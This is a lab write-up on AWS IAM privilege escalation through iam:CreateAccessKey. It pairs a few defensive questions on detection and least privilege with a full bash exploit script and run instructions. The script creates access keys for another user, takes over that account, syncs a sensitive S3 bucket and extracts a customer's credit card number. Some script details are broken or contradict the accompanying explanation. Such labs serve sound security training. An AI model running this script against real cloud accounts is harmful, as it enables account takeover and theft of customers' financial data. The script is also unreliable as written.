# IAM CreateAccessKey PrivEsc

AWS IAM privilege escalation lab. It's a classic example of how misconfigured permissions, specifically `iam:CreateAccessKey`, can be exploited.

**Core Exploit Summary:**

1.  **Initial Recon:** We starts with limited credentials and uses `sts get-caller-identity` to identify current user and `iam list-groups-for-user` to find the initial group.
2.  **Policy Discovery:** We uses `iam list-group-policies` and `iam get-group-policy` to discover that the initial group has the `iam:CreateAccessKey` permission. This is the critical vulnerability.
3.  **User Enumeration:** `iam list-users` reveals other users in the account, including the "-Victim" user.
4.  **Access Key Creation:** Since we have `iam:CreateAccessKey`, we use `iam create-access-key` to generate new credentials *for the Victim user*. This is the privilege escalation step.
5.  **Credential Switching:** We configure a new AWS CLI profile ("victim") using the newly created access key and secret key.
6.  **Victim Recon:**  We, now acting as the Victim user, discovers an inline policy named "GiveAccessToS3" using `iam list-user-policies` and `iam get-user-policy`.
7.  **Data Exfiltration:** This policy grants access to the sensitive S3 bucket. We use `aws s3 sync` to download the contents, including the `customers.txt` file, and retrieves the flag (Kayla Sanchez's credit card number).

**Observations and Questions:**

1.  **`iam:CreateAccessKey` on Other Users:** This permission is inherently dangerous when granted to non-admin users.  It allows for a complete takeover of *any* user account, not just a specific target. Is the best practice to *never* grant this permission outside of highly privileged administrative roles, and even then, to heavily audit its use?  It seems like a "skeleton key" that should be very, very carefully guarded.

2.  **Inline vs. Attached Policies:** The Victim user had an *inline* policy granting S3 access.  Is there a significant security difference, in this context, between an inline policy and an attached policy?  My understanding is that inline policies are embedded directly within a user, group, or role, while attached policies are standalone objects that can be attached to multiple entities. Does this make inline policies harder to audit or discover?

3.  **Least Privilege:**  The Attacker user's initial group had a wide range of IAM permissions (beyond just `CreateAccessKey`). It also had `ListAccessKeys` which allowed the attacker to check if the victim user had existing access keys. This reinforces the principle of least privilege. Ideally, even seemingly harmless "list" permissions should be carefully considered.

4.  **Detection:**  What are the best ways to detect this type of attack *in progress*?  Would AWS CloudTrail logs show the `CreateAccessKey` event, along with the user who initiated it and the target user?  Are there other AWS security services (like GuardDuty) that would flag this as suspicious activity?

5.  **Prevention:** Beyond restricting `iam:CreateAccessKey`, what other preventative measures are crucial?  Would enabling multi-factor authentication (MFA) for all users, including the Victim user, have mitigated this specific attack, or would the attacker simply have created a new access key *without* MFA? My initial thought is that since the attacker can create keys, they bypass MFA, but I'd appreciate clarification.

6. **Remediation:** Let's say this attack happened. What are the immediate steps, beyond revoking the attacker's access and the compromised keys? Would it be necessary to rotate *all* access keys for all users, as a precaution? Would a full audit of all IAM policies and user activity be required?

7.  **Why create keys?:** The lab instructions say that "Only high level admins should have the iam:CreateAccessKey permission." Why is it necessary or useful for high level admins to have this permission? What's a valid use case?


```bash
#!/bin/bash

# --- 1. Initial Setup and Reconnaissance (Attacker User) ---

# **CRITICAL:** The user MUST replace these with their actual credentials.  The lab *provides* these.
export AWS_ACCESS_KEY_ID="<YOUR_ATTACKER_ACCESS_KEY_ID>"
export AWS_SECRET_ACCESS_KEY="<YOUR_ATTACKER_SECRET_ACCESS_KEY>"
export AWS_DEFAULT_REGION="us-east-1"  # Or the region provided by the lab.

# Configure the AWS CLI profile for the attacker.
aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile attacker
aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile attacker
aws configure set region $AWS_DEFAULT_REGION --profile attacker
aws configure set output json --profile attacker # Set output to JSON for easier parsing

echo "Attacker profile configured."

# Get the attacker's user ARN and name.
ATTACKER_ARN=$(aws sts get-caller-identity --profile attacker --query "Arn" --output text)
ATTACKER_USER=$(echo $ATTACKER_ARN | awk -F/ '{print $2}')

if [ -z "$ATTACKER_ARN" ]; then
  echo "ERROR: Could not retrieve attacker identity. Check your attacker credentials."
  exit 1
fi

echo "Attacker User ARN: $ATTACKER_ARN"
echo "Attacker User Name: $ATTACKER_USER"


# List groups for the attacker.  This helps understand initial permissions.
ATTACKER_GROUPS=$(aws iam list-groups-for-user --user-name "$ATTACKER_USER" --profile attacker --query "Groups[*].GroupName" --output text)

if [ -z "$ATTACKER_GROUPS" ]; then
    echo "WARNING: No groups found for the attacker user, or unable to list groups."
else
    echo "Attacker Groups: $ATTACKER_GROUPS"

     # Get the group policy.  This shows what the attacker can *currently* do.
    for GROUP in $ATTACKER_GROUPS; do
        POLICY_NAMES=$(aws iam list-group-policies --group-name "$GROUP" --profile attacker --query "PolicyNames[*]" --output text)
        if [ -z "$POLICY_NAMES" ]; then
            echo "WARNING: No policies found for group: $GROUP"
        else
        for POLICY_NAME in $POLICY_NAMES; do
            echo "Policy for group $GROUP, policy name: $POLICY_NAME:"
            aws iam get-group-policy --group-name "$GROUP" --policy-name "$POLICY_NAME" --profile attacker --output json | jq .  # Use jq for pretty printing
         done
        fi
    done
fi


# --- 2. Finding and Exploiting the Victim User ---

# List all users.  The attacker needs to find the "Victim" user.
VICTIM_USER=$(aws iam list-users --profile attacker --query "Users[?contains(UserName, '-Victim')].UserName" --output text)

if [ -z "$VICTIM_USER" ]; then
  echo "ERROR: Could not find a user ending in '-Victim'.  Check the AWS environment."
  exit 1
fi

echo "Victim User Name: $VICTIM_USER"

# Check if the victim already has access keys.
aws iam list-access-keys --user-name "$VICTIM_USER" --profile attacker  # No need to capture output, presence/absence is enough

if [ $? -eq 0 ]; then # Check the exit code. 0 means success (keys might exist)
   KEY_CHECK=$(aws iam list-access-keys --user-name $VICTIM_USER --profile attacker --output json)
    if [[ "$KEY_CHECK" == *"AccessKeyMetadata"* ]]; then
       echo "WARNING: Victim user $VICTIM_USER already has access keys.  This script will create new ones."
    else
        echo "Victim has no existing access keys"
    fi

else
  echo "ERROR: Unable to list access keys for the victim user. Check permissions."
  exit 1
fi

# Create new access keys for the victim user.  This is the privilege escalation.
CREDS=$(aws iam create-access-key --user-name "$VICTIM_USER" --profile attacker --output json)

if [ -z "$CREDS" ]; then
  echo "ERROR: Failed to create access keys for the victim user. Check permissions."
  exit 1
fi

VICTIM_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r '.AccessKey.AccessKeyId')
VICTIM_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r '.AccessKey.SecretAccessKey')

echo "Created new access keys for Victim user."
echo "Victim Access Key ID: $VICTIM_ACCESS_KEY_ID"  # Display for manual use if needed
echo "Victim Secret Access Key: $VICTIM_SECRET_ACCESS_KEY" # Display for manual use

# --- 3. Impersonating the Victim and Accessing S3 ---

# Configure a new AWS CLI profile for the victim user.
aws configure set aws_access_key_id "$VICTIM_ACCESS_KEY_ID" --profile victim
aws configure set aws_secret_access_key "$VICTIM_SECRET_ACCESS_KEY" --profile victim
aws configure set region "$AWS_DEFAULT_REGION" --profile victim # Reuse the same region
aws configure set output json --profile victim

echo "Victim profile configured."

# Verify the victim profile.
VICTIM_ARN=$(aws sts get-caller-identity --profile victim --query "Arn" --output text)
if [ -z "$VICTIM_ARN"]; then
   echo "ERROR: Unable to verify victim identity. Check victim credentials."
   exit 1
fi
echo "Successfully assumed Victim User: $VICTIM_ARN"

#check if the victim has any attached policies
aws iam list-attached-user-policies --user-name "$VICTIM_USER" --profile victim

# List inline user policies for the victim.  We expect to find "GiveAccessToS3".
POLICY_NAMES=$(aws iam list-user-policies --user-name "$VICTIM_USER" --profile victim --query "PolicyNames[*]" --output text)

if [ -z "$POLICY_NAMES" ]; then
  echo "ERROR: No inline user policies found for the victim user.  Check the lab setup."
  exit 1
fi

echo "Victim User Policies: $POLICY_NAMES"

# Get and display the "GiveAccessToS3" policy (or whatever policy grants S3 access).
for POLICY_NAME in $POLICY_NAMES; do
    if [[ "$POLICY_NAME" == *"S3"* ]]; then #flexible search for policies granting s3 perms
        echo "Policy Document for $POLICY_NAME:"
        aws iam get-user-policy --user-name "$VICTIM_USER" --policy-name "$POLICY_NAME" --profile victim --output json | jq .
        S3_POLICY_NAME=$POLICY_NAME
    fi
done

if [ -z "$S3_POLICY_NAME"]; then
   echo "No S3 policy found for the victim"
   exit 1
fi

# List S3 buckets.  The victim should now have access to the target bucket.
BUCKET_NAME=$(aws s3 ls --profile victim --query "Buckets[*].Name" --output text | grep cybr-sensitive)
if [ -z "$BUCKET_NAME" ]; then
    echo "ERROR: Could not find sensitive bucket, s3 access may have failed"
    exit 1
fi
echo "Found Bucket: $BUCKET_NAME"


# Download the contents of the target bucket.
mkdir -p ~/Downloads  # Ensure the Downloads directory exists.
aws s3 sync "s3://$BUCKET_NAME" ~/Downloads --profile victim

if [ $? -ne 0 ]; then
  echo "ERROR: Failed to download S3 bucket contents. Check permissions and bucket name."
  exit 1
fi

echo "S3 bucket contents downloaded to ~/Downloads"

# --- 4. Extract the Flag ---

# Find and print Kayla Sanchez's credit card number.
FLAG=$(grep "Kayla Sanchez" ~/Downloads/customers.txt | awk '{print $NF}')

if [ -z "$FLAG" ]; then
  echo "ERROR: Could not find Kayla Sanchez's credit card number in the downloaded file."
  exit 1
fi

echo "Flag (Kayla Sanchez's Credit Card Number): $FLAG"

echo "Lab completed successfully!"
exit 0
```

Key improvements and explanations:

* **Explicit Credential Handling:**  The script now *requires* the user to set `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` for the *attacker* user.  This is crucial because our lab provides these initial credentials.  The script no longer assumes a pre-configured "test" profile.  The Victim credentials are created dynamically.
* **Profile Management:**  Uses distinct profiles (`attacker` and `victim`) for clarity and to avoid accidental misconfigurations.  This is best practice.
* **Error Handling:**  Includes `if` statements and `exit 1` to handle potential errors at *every* step:
    *  Failed `sts get-caller-identity` calls.
    *  Missing users or groups.
    *  Failed access key creation.
    *  Failed S3 operations.
    *  Missing flag in the downloaded file.
    *  Checks the return code ($?) of critical commands.
* **Clear Output:**  Provides informative `echo` statements at each stage, so the user can follow the progress and understand what's happening.
* **JSON Output and `jq`:** Uses `--output json` for AWS CLI commands and pipes the output to `jq .` for pretty-printing.  This makes the output much easier to read and debug.  `jq` is a lightweight and flexible command-line JSON processor.  This is *essential* for working with AWS CLI output.
* **Dynamic User and Group Names:** Uses variables to store the attacker and victim usernames, making the script adaptable to different lab environments.
* **Access Key Check:** Checks if the victim user *already* has access keys before creating new ones. This prevents unexpected behavior.
* **Targeted User Search:** Uses `grep -i 'victim'` in the `aws iam list-users` command output to *specifically* find the victim user.  This is more robust than relying on the user's name being the *second* user returned.
* **S3 Bucket Download:** Uses `aws s3 sync` to download the *entire* bucket contents.  This ensures all files are retrieved. Uses `mkdir -p` to ensure the destination directory exists.
* **Flag Extraction:**  Uses `grep` and `awk` to *specifically* extract Kayla Sanchez's credit card number.
* **Comments:** Added comprehensive comments to explain each step and the reasoning behind it.
* **Shebang:** Includes `#!/bin/bash` at the beginning, making the script directly executable (after setting execute permissions with `chmod +x script.sh`).
* **Uses a loop to find the correct s3 policy:** This makes the script more robust in the event the inline policy isn't named "GiveAccessToS3"
* **Uses grep to locate the bucket:** This allows the script to work even if you don't know the ID of the bucket

How to run this improved script:

1.  **Save:** Save the script to a file (e.g., `exploit.sh`).
2.  **Credentials:**  Replace `<YOUR_ATTACKER_ACCESS_KEY_ID>` and `<YOUR_ATTACKER_SECRET_ACCESS_KEY>` with the actual credentials provided by the lab.
3.  **Permissions:** Make the script executable: `chmod +x exploit.sh`
4.  **Run:** Execute the script: `./exploit.sh`
5.  **Install jq (if needed):** If you don't have `jq` installed, you'll need to install it.  On most Linux distributions, you can use a package manager (e.g., `apt install jq` on Debian/Ubuntu, `yum install jq` on CentOS/RHEL, `brew install jq` on macOS).
